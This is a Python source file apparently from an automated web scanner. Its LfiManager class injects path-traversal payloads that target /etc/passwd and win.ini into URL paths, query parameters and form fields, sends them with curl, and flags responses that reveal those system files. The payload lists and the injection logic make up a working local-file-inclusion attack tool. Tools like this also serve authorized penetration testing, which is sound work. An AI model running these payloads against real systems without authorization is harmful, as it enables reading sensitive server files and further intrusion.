import os
import urllib.parse as urlparse
from collections import defaultdict
from copy import deepcopy
from datetime import datetime
from typing import List
from Common.ProcessHandler import ProcessHandler
from Helpers.CacheHelper import CacheHelper
from Common.RequestHandler import RequestHandler
from Models.FormRequestDTO import FormRequestDTO
from Models.HeadRequestDTO import HeadRequestDTO
from Models.InjectionFoundDTO import InjectionFoundDTO, InjectionType


class LfiManager:
    def __init__(self, domain, request_handler):
        self._domain = domain
        self._url_params = ['cat', 'dir', 'action', 'board', 'date', 'detail', 'file', 'download', 'path', 'folder',
                            'prefix', 'include', 'page', 'inc', 'locate', 'show', 'doc', 'site', 'type', 'view',
                            'content', 'document', 'layout', 'mod', 'conf']
        self._lfi_path_payloads = ['/////../../etc/passwd', '/////../../../etc/passwd', '/////../../../../etc/passwd']
        self._lfi_param_payloads = ['../../etc/passwd',
                                    '../../../etc/passwd',
                                    '../../../../etc/passwd',
                                    '../../../../../etc/passwd',
                                    '../../../../../../etc/passwd',
                                    '../../../../../../../etc/passwd',
                                    '../../C:/windows/win.ini',
                                    '../../../C:/windows/win.ini',
                                    '../../../../C:/windows/win.ini',
                                    '../../../../../C:/windows/win.ini',
                                    '../../../../../../C:/windows/win.ini',
                                    '../../../../../../../C:/windows/win.ini',
                                    '..\..\C:\windows\win.ini',
                                    '..\..\..\C:\windows\win.ini',
                                    '..\..\..\..\C:\windows\win.ini',
                                    '..\..\..\..\..\C:\windows\win.ini',
                                    '..\..\..\..\..\..\C:\windows\win.ini',
                                    '..\..\..\..\..\..\..\C:\windows\win.ini',
                                    '..\/..\/etc\/passwd',
                                    '..\/..\/..\/etc\/passwd',
                                    '..\/..\/..\/..\/etc\/passwd',
                                    '..\/..\/..\/..\/..\/etc\/passwd',
                                    '..%2F..%2Fetc%2Fpasswd',
                                    '..%2F..%2F..%2Fetc%2Fpasswd',
                                    '..%2F..%2F..%2F..%2Fetc%2Fpasswd',
                                    '..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd']

        self._expected = ['; for 16-bit app support', 'root:x:0:0:root:']
        self._tool_dir = f'Results/LfiManager'
        self._request_handler = request_handler

    def check_get_requests(self, dtos: List[HeadRequestDTO]):

        if not os.path.exists(self._tool_dir):
            os.makedirs(self._tool_dir)

        cache_manager = CacheHelper('LfiManager/Get', self._domain, 'Results')
        result = cache_manager.get_saved_result()

        if not result and not isinstance(result, List):
            result: List[InjectionFoundDTO] = []
            grouped_urls = defaultdict(list)
            for dto in dtos:
                netloc = urlparse.urlparse(dto.url).netloc
                grouped_urls[netloc].append(dto.url)

            for url in grouped_urls:
                self.__check_path(url, result)

            for dto in dtos:
                if '?' in dto.url:
                    self.__check_route_params(dto.url, result)

            cache_manager.save_dtos(result)
        print(f'[{datetime.now().strftime("%H:%M:%S")}]: ({self._domain}) Found GET LFI: {len(result)}')

    def check_form_requests(self, form_results: List[FormRequestDTO]):
        cache_manager = CacheHelper('LfiManager/Form', self._domain, 'Results')
        result = cache_manager.get_saved_result()

        if not result and not isinstance(result, List):
            result: List[InjectionFoundDTO] = []
            counter = 0
            for item in form_results:
                print(f'[{datetime.now().strftime("%H:%M:%S")}]: ({self._domain}) LFI FORM counter ({counter} / {len(form_results)})')
                self.__send_lfi_form_request(item, result)
                counter += 1

            cache_manager.save_dtos(result)
        print(f'[{datetime.now().strftime("%H:%M:%S")}]: ({self._domain}) Found Form LFI: {len(result)}')

    def __check_path(self, url: str, result: List[InjectionFoundDTO]):
        parsed = urlparse.urlparse(url)
        basic_url = f'{parsed.scheme}://{parsed.netloc}/'
        payload_urls = set()
        for payload in self._lfi_path_payloads:
            payload_urls.add(f'{basic_url}{payload}')

        for payload_url in payload_urls:
            self.__check_lfi_payloads(payload_url, basic_url, result)

    def __check_route_params(self, url: str, result: List[InjectionFoundDTO]):
        payloads_urls = set()
        parsed = urlparse.urlparse(url)
        queries = [s for s in parsed.query.split("&") if any(xs in str(s).lower() for xs in self._url_params)]

        for query in queries:
            payloads = self.__get_route_payloads(url, str(query))
            payloads_urls.update(payloads)

        for payload_url in payloads_urls:
            self.__check_lfi_payloads(payload_url, url, result)

    def __check_lfi_payloads(self, payload_url: str, original_url: str, result: List[InjectionFoundDTO]):
        cmd_arr = ['curl', payload_url, "--path-as-is"]
        pk = ProcessHandler()
        bash_outputs = pk.run_temp_process(cmd_arr, timeout=5)

        if not any(keyword in output for output in bash_outputs for keyword in self._expected):
            return
        for keyword in self._expected:
            for output in bash_outputs:
                if keyword in output:

                    resp = self._request_handler.handle_request(original_url)
                    if resp and keyword in resp.text:
                        print(f'Lfi doublecheck failed on {keyword} with {original_url}')
                        continue

                    substr_index = output.find(keyword)
                    start_index = substr_index - 50 if substr_index - 50 > 0 else 0
                    last_index = substr_index + 50 if substr_index + 50 < len(output) else substr_index + len(
                        output) - substr_index - 1
                    details = output[start_index:last_index].replace('/n', '').replace('/r', '').strip()
                    log_header_msg = f'injFOUND: {keyword}; ' \
                                     f'URL: {payload_url}; ' \
                                     f'DETAILS: {details}'
                    curr_resp_length = len(output)
                    if not any(dto.response_length == curr_resp_length and dto.details_msg == log_header_msg
                               for dto in result):
                        print(log_header_msg)
                        result.append(InjectionFoundDTO(InjectionType.Lfi_Get, " ".join(cmd_arr), keyword, output,
                                                        log_header_msg))

    def __get_route_payloads(self, url: str, query: str):
        param_split = query.split('=')
        main_url_split = url.split(query)

        payloads = set()
        for lfi_payload in self._lfi_param_payloads:
            if param_split[0] in self._url_params:
                payloads.add(main_url_split[0] + param_split[0] + f'={lfi_payload}' + main_url_split[1])

        return payloads

    def __send_lfi_form_request(self, dto: FormRequestDTO, result: List[InjectionFoundDTO]):
        try:
            for form in dto.form_params:
                if form.method_type == "POST":
                    for param in form.params:
                        if any(s in str(param).lower() for s in self._url_params):
                            for keyword in self._lfi_param_payloads:
                                payload = deepcopy(form.params)
                                payload[param] = keyword

                                response = self._request_handler.handle_request(dto.url, post_data=payload)
                                if response and any(s in response.text for s in self._expected):
                                    substr_index = response.text.find(keyword)
                                    start_index = substr_index - 50 if substr_index - 50 > 0 else 0
                                    last_index = substr_index + 50 if substr_index + 50 < len(
                                        response.text) else substr_index + len(
                                        response.text) - substr_index - 1
                                    details = (response.text[start_index:last_index].replace('/n', '').replace('/r', '')
                                               .strip())
                                    log_header_msg = f'injFOUND: {keyword};' \
                                                     f'URL: {dto.url};' \
                                                     f'DETAILS: {details}'
                                    curr_resp_length = len(response.text)
                                    if not any(dto.response_length == curr_resp_length and
                                               dto.details_msg == log_header_msg for dto in result):
                                        print(log_header_msg)
                                        result.append(InjectionFoundDTO(InjectionType.Lfi_PostForm, payload,
                                                                        keyword, response.text, log_header_msg))
                elif form.method_type == "GET":
                    parsed = urlparse.urlparse(dto.url)
                    url_ending = len(form.action) * -1
                    if form.action.startswith('http'):
                        url = f'{form.action}?'
                    elif len(parsed.path) >= len(form.action) and str(parsed.path)[url_ending:] == form.action:
                        url = f'{parsed.scheme}://{parsed.netloc}{parsed.path}?'
                    else:
                        url = f'{parsed.scheme}://{parsed.netloc}/{form.action}?'

                    for param in form.params:
                        if any(s in str(param).lower() for s in self._url_params):
                            for keyword in self._lfi_param_payloads:
                                prev_url = url
                                url += (param + f'={keyword}&')

                                self.__check_lfi_payloads(url, prev_url, result)

                                url = prev_url
                else:
                    print("METHOD TYPE NOT FOUND: " + form.method_type)
                    return
        except Exception as inst:
            print(f"Exception - ({dto.url}) - {inst}")
